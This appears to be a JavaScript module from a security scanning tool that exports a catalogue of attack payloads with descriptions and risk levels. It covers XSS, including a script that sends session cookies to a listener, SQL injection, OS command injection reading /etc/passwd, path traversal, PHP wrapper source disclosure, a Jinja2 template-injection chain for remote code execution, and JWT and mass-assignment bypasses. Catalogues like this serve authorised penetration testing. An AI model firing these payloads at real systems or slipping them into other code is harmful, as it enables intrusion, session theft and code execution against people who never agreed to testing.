// ============================================================================
// CUSTOM PAYLOADS — Advanced Structured Security Intelligence Suite (AMSTA Lab)
// ============================================================================

// This is a .mjs (plain JavaScript) file, so types are expressed as JSDoc, not
// TypeScript syntax. Each entry is a structured probe with metadata.
/**
 * @typedef {object} PayloadMetadata
 * @property {string} payload        The probe string.
 * @property {string} description    What the probe does / tests.
 * @property {string} expectedResult The signal that indicates a positive.
 * @property {"LOW"|"MEDIUM"|"HIGH"|"CRITICAL"} riskLevel
 * @property {string} vectorType     Vulnerability class / vector.
 */

/** @type {Record<string, PayloadMetadata[]>} */
export const CUSTOM_PAYLOADS = {
  // ── XSS (Cross-Site Scripting - Advanced & Filter Bypass) ────────────────
  xss: [
    {
      payload: "<svg onload=alert(9173)>",
      description: "SVG-based onload event handler execution for modern HTML contexts.",
      expectedResult: "Browser executes JavaScript alert(9173) upon SVG rendering.",
      riskLevel: "HIGH",
      vectorType: "DOM_XSS / Stored XSS"
    },
    {
      payload: "\"><img src=x onerror=alert(9173)>",
      description: "Attribute breakout followed by image onerror event handler trigger.",
      expectedResult: "Fails to load resource 'x', triggering the onerror JS payload execution.",
      riskLevel: "HIGH",
      vectorType: "Reflected XSS"
    },
    {
      payload: "<script>fetch('http://127.0.0.1:3003/log?cookie='+btoa(document.cookie))</script>",
      description: "Exfiltration vector targeting session cookies via out-of-band HTTP fetch.",
      expectedResult: "Browser sends encoded document.cookie payload to the designated listener endpoint.",
      riskLevel: "CRITICAL",
      vectorType: "Data Exfiltration / XSS"
    }
  ],

  // ── SQL injection (SQLi - Union, Error-based, Blind & Out-of-Band) ─────────
  sqli: [
    {
      payload: "' OR '1'='1'-- -",
      description: "Classic authentication or WHERE clause bypass via tautology.",
      expectedResult: "Evaluates to TRUE for all rows, returning unconstrained database records.",
      riskLevel: "HIGH",
      vectorType: "Authentication Bypass / Boolean SQLi"
    },
    {
      payload: "' UNION SELECT null, version(), user(), database()-- -",
      description: "UNION-based information extraction targeting database metadata.",
      expectedResult: "Appends query columns to reveal database version, active user, and current schema name.",
      riskLevel: "CRITICAL",
      vectorType: "Data Extraction (UNION SQLi)"
    },
    {
      payload: "1' AND (SELECT 9173 FROM (SELECT(SLEEP(2)))a)-- -",
      description: "Time-based blind SQL injection probe forcing thread suspension.",
      expectedResult: "Database delays response by specified seconds (2s), confirming vulnerability state.",
      riskLevel: "MEDIUM",
      vectorType: "Time-Based Blind SQLi"
    }
  ],

  // ── Command injection (OS Command Execution Probes) ─────────────────────
  command_injection: [
    {
      payload: "; id;",
      description: "Command chaining separator executing system identity probe.",
      expectedResult: "Server shell executes 'id' command and appends output to the response.",
      riskLevel: "CRITICAL",
      vectorType: "OS Command Injection"
    },
    {
      payload: "`cat /etc/passwd`",
      description: "Command substitution reading core Linux user account records.",
      expectedResult: "Evaluates backticks and returns system account file contents.",
      riskLevel: "CRITICAL",
      vectorType: "Remote Code Execution (RCE)"
    },
    {
      payload: "& ping -c 1 127.0.0.1 &",
      description: "Background asynchronous command execution probe.",
      expectedResult: "Executes ICMP ping utility on the underlying host system.",
      riskLevel: "HIGH",
      vectorType: "Network Diagnostic Abuse"
    }
  ],

  // ── Path traversal / LFI (Local File Inclusion & Wrappers) ──────────────
  path_traversal: [
    {
      payload: "../../../../etc/passwd",
      description: "Standard directory traversal sequence targeting Unix system configuration.",
      expectedResult: "Traverses out of web root to disclose local system user database.",
      riskLevel: "HIGH",
      vectorType: "Local File Inclusion (LFI)"
    },
    {
      payload: "php://filter/convert.base64-encode/resource=index.php",
      description: "PHP stream wrapper filter abuse to read source code without execution.",
      expectedResult: "Returns base64-encoded source code of the target PHP application file.",
      riskLevel: "HIGH",
      vectorType: "Source Disclosure / Wrapper Abuse"
    }
  ],

  // ── SSTI (Server-Side Template Injection RCE Probes) ───────────────────
  ssti: [
    {
      payload: "{{7*7}}",
      description: "Basic mathematical expression injection to test template evaluation.",
      expectedResult: "Template engine evaluates expression, returning '49' in output.",
      riskLevel: "MEDIUM",
      vectorType: "Template Engine Probe"
    },
    {
      payload: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
      description: "Advanced Python Jinja2 gadget chain achieving Remote Code Execution.",
      expectedResult: "Executes system command 'id' via Python globals context and returns output.",
      riskLevel: "CRITICAL",
      vectorType: "Template Injection RCE"
    }
  ],

  // ── API / Auth Bypass / JWT / Mass Assignment ────────────
  api_auth_bypass: [
    {
      payload: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn9.eyJ1c2VyIjoiYWRtaW4ifQ.",
      description: "JSON Web Token manipulation utilizing 'none' algorithm signature bypass.",
      expectedResult: "Server accepts unverified token and grants administrative user privileges.",
      riskLevel: "CRITICAL",
      vectorType: "Cryptographic / JWT Bypass"
    },
    {
      payload: "{\"role\": \"admin\"}",
      description: "Mass assignment payload injecting elevated role attributes during binding.",
      expectedResult: "Object deserializer binds unauthorized administrative role properties.",
      riskLevel: "HIGH",
      vectorType: "Mass Assignment / Privilege Escalation"
    }
  ]
};